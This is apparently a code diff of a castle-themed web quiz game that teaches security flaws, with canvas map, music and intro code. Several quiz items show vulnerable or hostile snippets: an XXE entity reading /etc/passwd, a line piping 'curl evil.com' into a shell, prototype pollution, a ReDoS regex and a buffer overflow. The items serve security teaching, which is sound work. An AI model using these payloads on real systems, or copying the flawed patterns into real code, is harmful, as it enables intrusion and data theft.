+   options:['SQL Injection in deductBalance','Race condition — both pass the check before either deducts','Missing authentication','async/await pattern is broken'],
+   correct:1,explanation:'This TOCTOU race condition allows double-spending. Fix: database transactions with row-level locking (SELECT FOR UPDATE) or optimistic locking with version numbers.'},
+  {id:23,xp:35,topic:'XXE',title:'The Ancient Scroll Parser',
+   body:"The castle XML parser processes this document. What can an attacker read?",
+   code:'<?xml version="1.0"?>\n<!DOCTYPE data [\n  <!ENTITY secret SYSTEM "file:///etc/passwd">\n]>\n<request>\n  <data>&secret;</data>\n</request>',
+   options:['XSS via XML in browser','XXE — reads arbitrary files from the server','CSRF via XML','SQL Injection in the XML'],
+   correct:1,explanation:'XML External Entity (XXE) attacks abuse XML parsers to read local files or hit internal services. Fix: disable external entity processing (FEATURE_SECURE_PROCESSING in most parsers).'},
+  {id:24,xp:30,topic:'Dependencies',title:'The Cursed Artifact',
+   body:"The castle uses a library with 3 critical CVEs from 4 years ago. What is the primary risk?",
+   code:'"dependencies": {\n  "ancient-spell-lib": "^1.0.0",  // CVE-2019-XXXX critical\n  "medieval-crypto": "0.0.1"       // Unmaintained since 2020\n}',
+   options:['Library name is not descriptive','^ allows minor version updates','Known CVEs can be exploited through your application','Breaking changes may occur'],
+   correct:2,explanation:'OWASP A06: Using Components with Known Vulnerabilities. A CVE in a dependency can be exploited through your app even if your code is perfect. Use npm audit, Snyk, or Dependabot — always patch promptly.'},
+  {id:25,xp:35,topic:'Logging & Monitoring',title:'The Silent Watchtower',
+   body:"An attack went undetected for 72 hours. Logs show it — but nobody was alerted. Which OWASP category failed?",
+   code:'// Event log:\n[03:42] Login failed x 500  <- no alert triggered\n[03:43] Admin account accessed\n[03:44] 50,000 records exported\n// First alert: 72 hours later',
+   options:['Broken Access Control','Security Misconfiguration','Security Logging and Monitoring Failures','Cryptographic Failures'],
+   correct:2,explanation:'OWASP A09: 500 failed logins should trigger an immediate alert. Best practices: log all auth events, alert on anomalies, retain logs 90+ days, and regularly test your detection capability.'},
+  {id:26,xp:30,topic:'Supply Chain',title:'The Poisoned Well',
+   body:"The castle installs a popular npm package that was secretly updated with malicious code. What attack is this?",
+   code:'// npm install helpful-utils\n// Version 1.2.3 looks fine...\n// Version 1.2.4 (auto-update) contains:\nexec("curl evil.com | sh"); // runs on install!',
+   options:['XSS via npm package','Supply chain attack — malicious code injected into a trusted dependency','SQL Injection via npm','CSRF from the package'],
+   correct:1,explanation:'Supply chain attacks target the software build process. Fix: pin exact dependency versions, use lockfiles, audit packages before installing, use tools like Socket or Snyk to monitor for malicious packages.'},
+  {id:27,xp:30,topic:'CORS',title:'The Open Drawbridge',
+   body:"The castle API returns this header. What is the security problem?",
+   code:'// API response header:\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n\n// Browser receives user\'s private data...',
+   options:['Header is too long','Wildcard CORS with credentials — any site can read authenticated responses','Missing HTTPS','Cookie is not set'],
+   correct:1,explanation:'CORS with both wildcard origin (*) and credentials:true is rejected by browsers — but a misconfigured server might reflect the Origin header. Always use specific allowlisted origins, never * with credentials.'},
+  {id:28,xp:35,topic:'Prototype Pollution',title:'The Corrupted Lineage',
+   body:"A library merges user-provided JSON into an object. What vulnerability exists?",
+   code:'function merge(target, src) {\n  for (var key in src) {\n    if (typeof src[key] === "object")\n      merge(target[key], src[key]);\n    else\n      target[key] = src[key];\n  }\n}\nmerge({}, JSON.parse(userInput)); // attacker sends __proto__',
+   options:['JSON parsing is too slow','Prototype pollution — attacker sets __proto__ to corrupt all objects','XSS via JSON','SQL Injection via JSON'],
+   correct:1,explanation:'Prototype pollution lets attackers inject properties into Object.prototype, affecting all objects in the app. Fix: block __proto__ and constructor.prototype keys, use Object.create(null) for data maps, or use structured-clone.'},
+  {id:29,xp:35,topic:'ReDoS',title:'The Infinite Labyrinth',
+   body:"The castle uses this regex to validate emails. What attack can freeze the server?",
+   code:'// Email validation regex\nvar emailRegex = /^([a-zA-Z0-9]+)*@domain\\.com$/;\n// Test: "aaaaaaaaaaaaaaaaaaaaaaaaaaaa@" — hangs for seconds!',
+   options:['Regex is too strict','ReDoS — evil input causes catastrophic backtracking, hanging the server','Missing case-insensitive flag','Regex does not handle subdomains'],
+   correct:1,explanation:'ReDoS (Regular Expression Denial of Service) exploits catastrophic backtracking in certain regex patterns. Fix: use linear-time regex engines, or test regexes with tools like safe-regex to detect vulnerable patterns.'},
+  {id:30,xp:30,topic:'Memory Safety',title:'The Leaking Fortress',
+   body:"Which coding practice creates the most dangerous memory vulnerabilities in C/C++ systems?",
+   code:'char buffer[64];\nsprintf(buffer, userInput); // no length limit!\n// If userInput > 64 chars: stack corruption, code execution!',
+   options:['Using sprintf instead of printf','Buffer overflow — no bounds checking allows stack corruption and code execution','Missing null terminator','Stack is too small'],
+   correct:1,explanation:'Buffer overflows allow attackers to overwrite memory and execute arbitrary code. Fix: use safe functions (snprintf with size limit), bounds-check all copies, prefer memory-safe languages, and enable stack protection flags (ASLR, canaries).'}
+]
 };
 
-// Current game vars
+// Select 5 random questions from each tier
+function selectQuestions() {
+  var selected = {};
+  ['paige','squire','knight'].forEach(function(tier) {
+    var pool = ALL_CHALLENGES[tier].slice();
+    // Shuffle pool
+    for (var i = pool.length - 1; i > 0; i--) {
+      var j = Math.floor(Math.random() * (i + 1));
+      var tmp = pool[i]; pool[i] = pool[j]; pool[j] = tmp;
+    }
+    selected[tier] = pool.slice(0, 5);
+  });
+  return selected;
+}
+
+// ═══════════════════════════════════════════════
+// GAME STATE
+// ═══════════════════════════════════════════════
+var state = JSON.parse(localStorage.getItem('sk4_state') || 'null') || {
+  xp:0, rank:'paige', completed:[], badges:[], session:null
+};
+
+// Ensure session questions are consistent
+var SESSION = null;
+if (state.session) {
+  SESSION = state.session;
+} else {
+  SESSION = selectQuestions();
+  state.session = SESSION;
+  localStorage.setItem('sk4_state', JSON.stringify(state));
+}
+
+// Flat ordered challenge list
+var CHALLENGES = SESSION.paige.concat(SESSION.squire).concat(SESSION.knight);
+
+var RANK_ORDER = ['paige','squire','knight'];
+var XP_THRESH  = {paige:0, squire:200, knight:500};
+var RANK_ICONS = {paige:'🛡️', squire:'⚔️', knight:'👑'};
+var RANK_LABELS= {paige:'Paige', squire:'Squire', knight:'Knight'};
+var RANK_CSS   = {paige:'rp', squire:'rs', knight:'rk'};
+
+var MAP_W = 3600, MAP_H = 560, CAM_EASE = 0.07;
+
+// Waypoints: start + 15 stones + castle
+var WAYPOINTS = [
+  {x:80,  y:440},{x:260, y:400},{x:460, y:450},{x:650, y:410},{x:850, y:450},
+  {x:1060,y:410},{x:1280,y:440},{x:1480,y:400},{x:1680,y:450},{x:1880,y:410},
+  {x:2080,y:450},{x:2300,y:410},{x:2500,y:450},{x:2700,y:410},{x:2900,y:450},
+  {x:3100,y:410},{x:3380,y:430}
+];
+
 var current = null;
+var shuffledOpts = []; // shuffled options for current question
+var shuffledCorrect = 0; // correct index in shuffled array
 var answered = false;
-var apiKey = sessionStorage.getItem('sk3_key') || '';
+var apiKey = sessionStorage.getItem('sk4_key') || '';
 var demoMode = false;
 var wizBusy = false;
-var wizShown = true;
+var stoneIdx = 0;
 
-// Map offscreen canvas
-var mapCanvas = null;
-
-// Character position & animation
-var charX = WAYPOINTS[0].x;
-var charY = WAYPOINTS[0].y;
-var charTargetX = WAYPOINTS[0].x;
-var charTargetY = WAYPOINTS[0].y;
-var charFrame = 0;
-var charFrameTimer = 0;
-var charFacing = 1;
-var charMoving = false;
-var charAction = 'idle'; // idle, walk, victory, stumble
-
-// Camera
-var camX = 0;
-var camTargetX = 0;
-
-// Current stone index (which stone the character is at or heading to)
-var stoneIdx = 0; // 0 = start, 1-15 = challenge stones
-
-// Game states: MODAL, WALKING, AT_STONE, QUESTIONING, VICTORY, DEFEATED
-var gameState = 'MODAL';
-
-// Canvas refs
-var gc, ctx;
+var gc, ctx, mapCanvas, mapBuilt = false;
 var vpW, vpH;
-
-// Frame counter for animations
+var charX = WAYPOINTS[0].x, charY = WAYPOINTS[0].y;
+var charTargetX = charX, charTargetY = charY;
+var charFrame = 0, charFrameTimer = 0, charFacing = 1;
+var charMoving = false, charAction = 'idle';
+var camX = 0, camTargetX = 0;
+var gameState = 'INTRO';
 var tick = 0;
+var sidebarShown = true, wizShown = true;
 
-// ═══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
+// MUSIC ENGINE
+// ═══════════════════════════════════════════════
+var Music = {
+  ctx: null, master: null, playing: false, muted: false, loopTimer: null,
+
+  start: function() {
+    if (this.playing) return;
+    try {
+      this.ctx = new (window.AudioContext || window.webkitAudioContext)();
+      this.master = this.ctx.createGain();
+      this.master.gain.value = 0.35;
+      this.master.connect(this.ctx.destination);
+      this.playing = true;
+      this.loop(this.ctx.currentTime);
+    } catch(e) { console.log('Audio not available'); }
+  },
+
+  toggle: function() {
+    if (!this.ctx) { this.start(); return; }
+    this.muted = !this.muted;
+    if (this.master) this.master.gain.value = this.muted ? 0 : 0.35;
+    document.getElementById('btnMute').textContent = this.muted ? '🔇' : '🔊';
+  },
+
+  note: function(freq, start, dur, type, vol) {
+    if (!this.playing || !this.ctx) return;
+    var o = this.ctx.createOscillator();
+    var g = this.ctx.createGain();
+    o.connect(g); g.connect(this.master);
+    o.type = type || 'sine';
+    o.frequency.value = freq;
+    g.gain.setValueAtTime(0, start);
+    g.gain.linearRampToValueAtTime(vol || 0.25, start + 0.04);
+    g.gain.exponentialRampToValueAtTime(0.001, start + dur * 0.88);
+    o.start(start); o.stop(start + dur);
+  },
+
+  loop: function(t) {
+    if (!this.playing) return;
+    var b = 60 / 108; // tempo
+    // C major pentatonic: C4, E4, G4, A4, C5, E5
+    var sc = [261.6, 329.6, 392, 440, 523.3, 659.3];
+    // Melody (16 steps)
+    var mel = [4,5,4,3,2,3,4,2, 3,4,5,4,3,2,1,0];
+    var dur = [1,1,1,2,1,1,2,1, 1,1,1,1,1,1,1,2];
+    var total = dur.reduce(function(a,b){return a+b;},0);
+
+    var mt = t;
+    for (var i = 0; i < mel.length; i++) {
+      this.note(sc[mel[i]], mt, dur[i]*b*0.8, 'sine', 0.2);
+      // Harmony (fifth above)
+      if (i % 2 === 0) this.note(sc[Math.min(mel[i]+2,5)], mt, dur[i]*b*0.7, 'sine', 0.07);
+      mt += dur[i] * b;
+    }
+
+    // Bass (every 4 beats)
+    var bass = [65.4, 130.8, 98, 130.8]; // C2, C3, G2, C3
+    for (var i = 0; i < 4; i++) {
+      this.note(bass[i], t + i*4*b, 3.5*b, 'sine', 0.15);
+    }
+
+    // Drum (noise burst)
+    var self = this;
+    for (var i = 0; i < 4; i++) {
+      (function(beat) {
+        var bt = t + beat * 4 * b;
+        if (bt < self.ctx.currentTime + 0.01) return;
+        var buf = self.ctx.createBuffer(1, self.ctx.sampleRate * 0.05, self.ctx.sampleRate);
+        var d = buf.getChannelData(0);
+        for (var j = 0; j < d.length; j++) d[j] = (Math.random()*2-1) * Math.exp(-j/500);
+        var src = self.ctx.createBufferSource();
+        src.buffer = buf;
+        var dg = self.ctx.createGain();
+        src.connect(dg); dg.connect(self.master);
+        dg.gain.value = 0.12;
+        src.start(bt);
+      })(i);
+    }
+
+    var loopDur = total * b;
+    var self = this;
+    this.loopTimer = setTimeout(function() { self.loop(t + loopDur); }, (loopDur - 0.5) * 1000);
+  }
+};
+
+// ═══════════════════════════════════════════════
+// INTRO
+// ═══════════════════════════════════════════════
+var introSlide = 0, introTimer = null;
+var INTRO_SLIDES = 4;
+
+function runIntro() {
+  // Generate stars
+  var stars = document.getElementById('intro-stars');
+  for (var i = 0; i < 150; i++) {
+    var s = document.createElement('div');
+    s.className = 'istar';
+    s.style.cssText = 'left:' + Math.random()*100 + '%;top:' + Math.random()*100 + '%;' +
+      'width:' + (Math.random()*2+1) + 'px;height:' + (Math.random()*2+1) + 'px;' +
+      '--d:' + (Math.random()*3+2) + 's;--o:' + (Math.random()*0.8+0.2) + ';' +
+      'animation-delay:' + Math.random()*3 + 's;';
+    stars.appendChild(s);
+  }
+
+  // Intro canvas scene
+  var ic = document.getElementById('intro-canvas');
+  var ictx = ic.getContext('2d');
+  ic.width = window.innerWidth; ic.height = window.innerHeight;
+
+  function drawIntroScene() {
+    ictx.clearRect(0,0,ic.width,ic.height);
+    var t = Date.now() / 1000;
+
+    // Ground
+    ictx.fillStyle = '#0A1A0A';
+    ictx.fillRect(0, ic.height*0.7, ic.width, ic.height*0.3);
+
+    // Distant castle silhouette
+    ictx.fillStyle = 'rgba(20,15,35,0.8)';
+    var cx = ic.width * 0.75;
+    var cy = ic.height * 0.4;
+    ictx.fillRect(cx-80, cy, 160, ic.height*0.3);
+    for (var i = 0; i < 5; i++) {
+      ictx.fillRect(cx - 80 + i*40, cy - 40, 25, 40);
+    }
+    // Castle glow
+    ictx.fillStyle = 'rgba(80,40,160,0.15)';
+    ictx.beginPath();
+    ictx.arc(cx, cy+20, 120, 0, Math.PI*2);
+    ictx.fill();
+
+    // Fireflies
+    for (var i = 0; i < 8; i++) {
+      var fx = ic.width*0.3 + Math.sin(t*0.7 + i*0.8)*ic.width*0.15;
+      var fy = ic.height*0.5 + Math.cos(t*0.5 + i*1.2)*ic.height*0.15;
+      var fo = 0.3 + Math.sin(t*2 + i) * 0.3;
+      ictx.fillStyle = 'rgba(200,220,50,' + fo + ')';
+      ictx.beginPath();
+      ictx.arc(fx, fy, 2.5, 0, Math.PI*2);
+      ictx.fill();
+    }
+
+    // Torch flame at bottom
+    ictx.fillStyle = 'rgba(255,120,0,' + (0.6 + Math.sin(t*4)*0.3) + ')';
+    ictx.beginPath();
+    ictx.arc(ic.width*0.2, ic.height*0.7, 15 + Math.sin(t*5)*3, 0, Math.PI*2);
+    ictx.fill();
+    ictx.fillStyle = 'rgba(255,220,0,' + (0.8 + Math.sin(t*5)*0.2) + ')';
+    ictx.beginPath();
+    ictx.arc(ic.width*0.2, ic.height*0.7, 6, 0, Math.PI*2);
+    ictx.fill();
+
+    requestAnimationFrame(drawIntroScene);
+  }
+  drawIntroScene();
+
+  // Auto-advance slides
+  advanceSlide();
+}
+
+function advanceSlide() {
+  if (introTimer) clearTimeout(introTimer);
+  if (introSlide < INTRO_SLIDES - 1) {
+    introTimer = setTimeout(function() {
+      introSlide++;
+      showSlide(introSlide);
+      advanceSlide();
+    }, 3500);
+  }
+}
+
+function showSlide(n) {
+  document.querySelectorAll('.intro-slide').forEach(function(s,i) {
+    s.classList.toggle('active', i === n);
+  });
+}
+
+function skipIntro() {
+  if (introTimer) clearTimeout(introTimer);
+  document.getElementById('intro').classList.add('done');
+  showKeyModal();
+}
+
+function startIntro() {
+  document.getElementById('intro').classList.add('done');
+  showKeyModal();
+}
+
+// ═══════════════════════════════════════════════
 // MAP BUILDING
-// ═══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 function buildMap() {
+  if (mapBuilt) return;
+  mapBuilt = true;
   mapCanvas = document.createElement('canvas');
-  mapCanvas.width = MAP_W;
-  mapCanvas.height = MAP_H;
+  mapCanvas.width = MAP_W; mapCanvas.height = MAP_H;
   var mc = mapCanvas.getContext('2d');
+  var z1 = MAP_W/3, z2 = MAP_W*2/3;
 
-  // ── SKY GRADIENTS ──
-  // Zone 1: Meadow (0 to MAP_W/3)
-  var z1 = MAP_W / 3;
-  var z2 = MAP_W * 2 / 3;
+  // Sky zones
+  var g = mc.createLinearGradient(0,0,0,MAP_H*0.55);
+  g.addColorStop(0,'#1A6B9E'); g.addColorStop(1,'#5BACD4');
+  mc.fillStyle=g; mc.fillRect(0,0,z1,MAP_H*0.55);
+  g = mc.createLinearGradient(0,0,0,MAP_H*0.55);
+  g.addColorStop(0,'#0A2A1A'); g.addColorStop(1,'#1A4A2A');
+  mc.fillStyle=g; mc.fillRect(z1,0,z2-z1,MAP_H*0.55);
+  g = mc.createLinearGradient(0,0,0,MAP_H*0.55);
+  g.addColorStop(0,'#0A0A1E'); g.addColorStop(1,'#1A0A2E');
+  mc.fillStyle=g; mc.fillRect(z2,0,MAP_W-z2,MAP_H*0.55);
 
-  // Meadow sky
-  var meadSky = mc.createLinearGradient(0, 0, 0, MAP_H * 0.55);
-  meadSky.addColorStop(0, '#1A6B9E');
-  meadSky.addColorStop(1, '#5BACD4');
-  mc.fillStyle = meadSky;
-  mc.fillRect(0, 0, z1, MAP_H * 0.55);
+  // Ground zones
+  g = mc.createLinearGradient(0,MAP_H*0.5,0,MAP_H);
+  g.addColorStop(0,'#3A8A2A'); g.addColorStop(1,'#1E5010');
+  mc.fillStyle=g; mc.fillRect(0,MAP_H*0.5,z1,MAP_H*0.5);
+  g = mc.createLinearGradient(0,MAP_H*0.5,0,MAP_H);
+  g.addColorStop(0,'#1A3A0A'); g.addColorStop(1,'#0A1E04');
+  mc.fillStyle=g; mc.fillRect(z1,MAP_H*0.5,z2-z1,MAP_H*0.5);
+  g = mc.createLinearGradient(0,MAP_H*0.5,0,MAP_H);
+  g.addColorStop(0,'#2A2A3A'); g.addColorStop(1,'#141420');
+  mc.fillStyle=g; mc.fillRect(z2,MAP_H*0.5,MAP_W-z2,MAP_H*0.5);
 
-  // Forest sky
-  var forestSky = mc.createLinearGradient(z1, 0, z1, MAP_H * 0.55);
-  forestSky.addColorStop(0, '#0A2A1A');
-  forestSky.addColorStop(1, '#1A4A2A');
-  mc.fillStyle = forestSky;
-  mc.fillRect(z1, 0, z2 - z1, MAP_H * 0.55);
+  // Hills
+  mc.fillStyle='#4CAF50';
+  for(var i=0;i<6;i++){mc.beginPath();mc.ellipse(i*180+90,MAP_H*0.52,120,45,0,Math.PI,0);mc.fill();}
+  mc.fillStyle='#1A4A1A';
+  for(var i=0;i<6;i++){mc.beginPath();mc.ellipse(z1+i*180+90,MAP_H*0.52,110,55,0,Math.PI,0);mc.fill();}
 
-  // Castle sky
-  var castleSky = mc.createLinearGradient(z2, 0, z2, MAP_H * 0.55);
-  castleSky.addColorStop(0, '#0A0A1E');
-  castleSky.addColorStop(1, '#1A0A2E');
-  mc.fillStyle = castleSky;
-  mc.fillRect(z2, 0, MAP_W - z2, MAP_H * 0.55);
+  // Castle background
+  mc.fillStyle='#1E1E2E';
+  mc.fillRect(z2+200,0,MAP_W-z2-200,MAP_H*0.54);
+  mc.fillStyle='#2A2A3A';
+  for(var i=0;i<20;i++) mc.fillRect(z2+200+i*80,0,40,MAP_H*0.10);
+  mc.fillStyle='rgba(255,120,0,.35)';
+  for(var i=0;i<8;i++){mc.beginPath();mc.arc(z2+250+i*140,MAP_H*0.18,12,0,Math.PI*2);mc.fill();}
 
-  // ── GROUND ──
-  // Meadow ground
-  var meadGround = mc.createLinearGradient(0, MAP_H * 0.5, 0, MAP_H);
-  meadGround.addColorStop(0, '#3A8A2A');
-  meadGround.addColorStop(0.3, '#2E7020');
-  meadGround.addColorStop(1, '#1E5010');
-  mc.fillStyle = meadGround;
-  mc.fillRect(0, MAP_H * 0.5, z1, MAP_H * 0.5);
+  // Clouds
+  mc.fillStyle='rgba(255,255,255,0.65)';
+  [[150,60,70],[420,40,90],[750,70,60],[1000,50,80]].forEach(function(c){drawCloud(mc,c[0],c[1],c[2]);});
+  mc.fillStyle='rgba(60,40,80,0.55)';
+  [[2700,55,100],[2950,40,80],[3200,65,110],[3450,45,70]].forEach(function(c){drawCloud(mc,c[0],c[1],c[2]);});
 
-  // Forest ground
-  var forestGround = mc.createLinearGradient(z1, MAP_H * 0.5, z1, MAP_H);
-  forestGround.addColorStop(0, '#1A3A0A');
-  forestGround.addColorStop(1, '#0A1E04');
-  mc.fillStyle = forestGround;
-  mc.fillRect(z1, MAP_H * 0.5, z2 - z1, MAP_H * 0.5);
-
-  // Castle ground
-  var castleGround = mc.createLinearGradient(z2, MAP_H * 0.5, z2, MAP_H);
-  castleGround.addColorStop(0, '#2A2A3A');
-  castleGround.addColorStop(1, '#141420');
-  mc.fillStyle = castleGround;
-  mc.fillRect(z2, MAP_H * 0.5, MAP_W - z2, MAP_H * 0.5);
-
-  // ── HORIZON BLENDS ──
-  // Zone 1 hills
-  mc.fillStyle = '#4CAF50';
-  for (var i = 0; i < 6; i++) {
-    mc.beginPath();
-    mc.ellipse(i * 180 + 90, MAP_H * 0.52, 120, 45, 0, Math.PI, 0);
-    mc.fill();
+  // Path
+  mc.strokeStyle='rgba(139,100,48,.85)'; mc.lineWidth=26; mc.lineCap='round'; mc.lineJoin='round';
+  mc.beginPath(); mc.moveTo(WAYPOINTS[0].x,WAYPOINTS[0].y);
+  for(var i=1;i<WAYPOINTS.length;i++){
+    var p=WAYPOINTS[i-1],q=WAYPOINTS[i];
+    mc.quadraticCurveTo(p.x,p.y,(p.x+q.x)/2,(p.y+q.y)/2);
   }
-  // Zone 2 dark hills
-  mc.fillStyle = '#1A4A1A';
-  for (var i = 0; i < 6; i++) {
-    mc.beginPath();
-    mc.ellipse(z1 + i * 180 + 90, MAP_H * 0.52, 110, 55, 0, Math.PI, 0);
-    mc.fill();
-  }
-  // Zone 3 castle wall in background
-  mc.fillStyle = '#1E1E2E';
-  mc.fillRect(z2 + 200, 0, MAP_W - z2 - 200, MAP_H * 0.54);
-  // Castle battlements
-  mc.fillStyle = '#2A2A3A';
-  for (var i = 0; i < 20; i++) {
-    mc.fillRect(z2 + 200 + i * 80, 0, 40, MAP_H * 0.10);
-  }
-  // Castle windows (torch glow)
-  mc.fillStyle = 'rgba(255,120,0,.4)';
-  for (var i = 0; i < 8; i++) {
-    var wx = z2 + 250 + i * 140;
-    var wy = MAP_H * 0.18;
-    mc.beginPath();
-    mc.arc(wx, wy, 12, 0, Math.PI * 2);
-    mc.fill();
-  }
-
-  // ── PATH (dirt road) ──
-  mc.strokeStyle = '#8B6430';
-  mc.lineWidth = 28;
-  mc.lineCap = 'round';
-  mc.lineJoin = 'round';
-  mc.beginPath();
-  mc.moveTo(WAYPOINTS[0].x, WAYPOINTS[0].y);
-  for (var i = 1; i < WAYPOINTS.length; i++) {
-    var prev = WAYPOINTS[i - 1];
-    var curr = WAYPOINTS[i];
-    var mx = (prev.x + curr.x) / 2;
-    mc.quadraticCurveTo(prev.x, prev.y, mx, (prev.y + curr.y) / 2);
-  }
-  mc.lineTo(WAYPOINTS[WAYPOINTS.length - 1].x, WAYPOINTS[WAYPOINTS.length - 1].y);
+  mc.lineTo(WAYPOINTS[WAYPOINTS.length-1].x,WAYPOINTS[WAYPOINTS.length-1].y);
   mc.stroke();
+  mc.strokeStyle='rgba(210,170,100,.2)'; mc.lineWidth=14; mc.stroke();
 
-  // Path edge highlight
-  mc.strokeStyle = 'rgba(180,140,80,.4)';
-  mc.lineWidth = 32;
-  mc.globalCompositeOperation = 'destination-over';
-  mc.stroke();
-  mc.globalCompositeOperation = 'source-over';
+  // Trees and decorations
+  [90,200,350,500,700,900,1100].forEach(function(x){drawOak(mc,x,MAP_H*0.48-20);});
+  [1350,1500,1650,1800,1950,2050].forEach(function(x){drawPine(mc,x,MAP_H*0.5-30);});
+  var fc=['#FFD700','#FF6B6B','#FF85A1','#FFA500'];
+  for(var i=0;i<55;i++){
+    mc.fillStyle=fc[i%4];mc.beginPath();
+    mc.arc(Math.sin(i*1.618)*z1*0.42+z1*0.45,MAP_H*0.56+Math.cos(i*2.1)*45,3+Math.cos(i)*1.5,0,Math.PI*2);mc.fill();
+  }
+  for(var i=0;i<8;i++){drawTorch(mc,z2+100+i*170,MAP_H*0.54);}
+  for(var i=0;i<6;i++){
+    mc.strokeStyle='rgba(255,80,0,.35)';mc.lineWidth=3;mc.beginPath();
+    var lx=z2+200+i*160;mc.moveTo(lx,MAP_H*0.57);mc.lineTo(lx+30,MAP_H*0.62);mc.lineTo(lx+60,MAP_H*0.58);mc.stroke();
+    mc.fillStyle='rgba(255,80,0,.18)';mc.beginPath();mc.ellipse(lx+30,MAP_H*0.62,32,8,.2,0,Math.PI*2);mc.fill();
+  }
+  mc.font='18px serif';
+  for(var i=0;i<5;i++) mc.fillText('💀',z2+300+i*180,MAP_H*0.55);
 
-  // Path center highlight
-  mc.strokeStyle = 'rgba(210,170,100,.25)';
-  mc.lineWidth = 14;
-  mc.stroke();
-
-  // ── DECORATIONS ──
-  drawDecorations(mc, z1, z2);
-
-  // ── ZONE LABELS ──
-  mc.font = 'bold 13px Cinzel, serif';
-  mc.fillStyle = 'rgba(232,200,100,.5)';
-  mc.textAlign = 'center';
-  mc.fillText('⸻ THE GREEN FIELDS ⸻', z1 / 2, 28);
-  mc.fillText('⸻ THE DARK FOREST ⸻', z1 + (z2 - z1) / 2, 28);
-  mc.fillText('⸻ THE SHADOW CASTLE ⸻', z2 + (MAP_W - z2) / 2, 28);
-
-  // ── CLOUDS (zone 1) ──
-  mc.fillStyle = 'rgba(255,255,255,0.7)';
-  drawCloud(mc, 150, 60, 70);
-  drawCloud(mc, 420, 40, 90);
-  drawCloud(mc, 750, 70, 60);
-  drawCloud(mc, 1000, 50, 80);
-  // Dark storm clouds (zone 3)
-  mc.fillStyle = 'rgba(60,40,80,0.6)';
-  drawCloud(mc, 2700, 55, 100);
-  drawCloud(mc, 2950, 40, 80);
-  drawCloud(mc, 3200, 65, 110);
-  drawCloud(mc, 3450, 45, 70);
+  // Zone labels
+  mc.font='bold 12px Cinzel,serif';mc.fillStyle='rgba(232,200,100,.45)';mc.textAlign='center';
+  mc.fillText('⸺ THE GREEN FIELDS ⸺',z1/2,26);
+  mc.fillText('⸺ THE DARK FOREST ⸺',z1+(z2-z1)/2,26);
+  mc.fillText('⸺ THE SHADOW CASTLE ⸺',z2+(MAP_W-z2)/2,26);
 }
 
-function drawCloud(mc, x, y, r) {
-  mc.beginPath();
-  mc.arc(x, y, r, 0, Math.PI * 2);
-  mc.arc(x + r * 0.7, y - r * 0.3, r * 0.7, 0, Math.PI * 2);
-  mc.arc(x - r * 0.7, y - r * 0.2, r * 0.6, 0, Math.PI * 2);
-  mc.arc(x + r * 1.3, y, r * 0.5, 0, Math.PI * 2);
-  mc.fill();
+function drawCloud(mc,x,y,r){
+  mc.beginPath();mc.arc(x,y,r,0,Math.PI*2);mc.arc(x+r*.7,y-r*.3,r*.7,0,Math.PI*2);
+  mc.arc(x-r*.7,y-r*.2,r*.6,0,Math.PI*2);mc.arc(x+r*1.3,y,r*.5,0,Math.PI*2);mc.fill();
+}
+function drawOak(mc,x,y){
+  mc.fillStyle='#5A3A1A';mc.fillRect(x-5,y,10,40);
+  mc.fillStyle='#2E8B2E';mc.beginPath();mc.arc(x,y-10,35,0,Math.PI*2);mc.fill();
+  mc.fillStyle='#3AAA3A';mc.beginPath();mc.arc(x-12,y-20,22,0,Math.PI*2);mc.fill();
+  mc.fillStyle='#4ABB4A';mc.beginPath();mc.arc(x+8,y-25,18,0,Math.PI*2);mc.fill();
+}
+function drawPine(mc,x,y){
+  mc.fillStyle='#3A2A14';mc.fillRect(x-4,y+10,8,30);
+  var cols=['#0A3A0A','#0F5A0F','#156515'];
+  for(var i=0;i<3;i++){mc.fillStyle=cols[i];mc.beginPath();mc.moveTo(x,y-30-i*20);mc.lineTo(x-28+i*8,y+i*20);mc.lineTo(x+28-i*8,y+i*20);mc.closePath();mc.fill();}
+}
+function drawTorch(mc,x,y){
+  mc.fillStyle='#5A3A1A';mc.fillRect(x-3,y-5,6,20);
+  mc.fillStyle='rgba(255,140,0,.35)';mc.beginPath();mc.arc(x,y-8,18,0,Math.PI*2);mc.fill();
+  mc.fillStyle='#FF8C00';mc.beginPath();mc.arc(x,y-10,6,0,Math.PI*2);mc.fill();
+  mc.fillStyle='#FFD700';mc.beginPath();mc.arc(x,y-12,3,0,Math.PI*2);mc.fill();
 }
 
-function drawDecorations(mc, z1, z2) {
-  // ── ZONE 1: Meadow trees & flowers ──
-  var meadowTrees = [90, 200, 350, 500, 700, 900, 1100];
-  meadowTrees.forEach(function(tx) {
-    drawOakTree(mc, tx, MAP_H * 0.48 - 20);
-  });
-  // Flowers
-  var flowerColors = ['#FFD700', '#FF6B6B', '#FF85A1', '#FFA500', '#FF69B4'];
-  for (var i = 0; i < 60; i++) {
-    var fx = Math.sin(i * 1.618) * z1 * 0.45 + z1 * 0.45;
-    var fy = MAP_H * 0.56 + Math.cos(i * 2.1) * 50;
-    mc.fillStyle = flowerColors[i % flowerColors.length];
-    mc.beginPath();
-    mc.arc(fx, fy, 3 + Math.cos(i) * 1.5, 0, Math.PI * 2);
-    mc.fill();
-  }
+// ═══════════════════════════════════════════════
+// KNIGHT DRAWING
+// ═══════════════════════════════════════════════
+function drawKnight(ctx,cx,cy,frame,dir,action){
+  ctx.save(); ctx.translate(cx,cy);
+  if(dir<0) ctx.scale(-1,1);
+  var f=frame%4;
+  var bob=[0,-4,0,-4][f];
+  var ls=[7,0,-7,0][f];
+  var as=[-3,0,3,0][f];
+  if(action==='victory'){bob=-10+Math.sin(Date.now()/130)*5;as=Math.sin(Date.now()/110)*12;}
+  if(action==='stumble'){bob=Math.sin(Date.now()/80)*4;}
 
-  // ── ZONE 2: Pine trees ──
-  var forestTrees = [1310, 1420, 1550, 1650, 1800, 1950, 2100];
-  forestTrees.forEach(function(tx) {
-    drawPineTree(mc, tx, MAP_H * 0.5 - 30);
-  });
-  // Mushrooms
-  for (var i = 0; i < 12; i++) {
-    var mx = z1 + 50 + i * 110;
-    var my = MAP_H * 0.58 + (i % 3) * 15;
-    drawMushroom(mc, mx, my);
-  }
-  // Rocks
-  for (var i = 0; i < 8; i++) {
-    var rx = z1 + 80 + i * 140;
-    var ry = MAP_H * 0.6;
-    mc.fillStyle = '#3A3A4A';
-    mc.beginPath();
-    mc.ellipse(rx, ry, 20 + i % 3 * 8, 12, 0, 0, Math.PI * 2);
-    mc.fill();
-    mc.fillStyle = '#4A4A5A';
-    mc.beginPath();
